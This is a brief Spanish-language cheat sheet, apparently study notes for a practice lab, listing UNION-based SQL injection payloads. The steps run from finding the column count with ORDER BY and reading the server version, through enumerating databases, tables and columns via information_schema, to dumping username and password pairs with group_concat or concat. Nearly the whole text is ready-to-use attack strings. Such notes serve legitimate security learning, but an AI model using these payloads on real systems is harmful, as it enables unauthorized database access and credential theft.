
* Primero debemos de buscar el total de columnas existentes que nos muestra la Web
    + ' order by 10-- -
    + ' order by 5-- -
    + ' order by 2-- -
    + ' union select 1,2-- -
    + ' union select  'hola','markos'-- -
    + ' union select  @@version-- -
    + ' union select  1,schema_name from information_schema.schemata-- - (bases de datos)
    + ' union select  1,table_name from information_schema.tables where table_schema='DB'-- - (tablas de la base de datos)
    + ' union select  1,column_name from information_schema.columns where table_schema='DB' and table_name='TABLE'-- -
    + ' union select 1,group_concat(username,0x3a,password) from academy_labs.products-- -
    + ' union select 1,concat(username,0x3a,password) from academy_labs.products-- - (si no funciona group_concat)
    + ' union select 1,group_concat(username||0x3a||password) from academy_labs.products-- - (forma alternativa de poner las comas)
    + 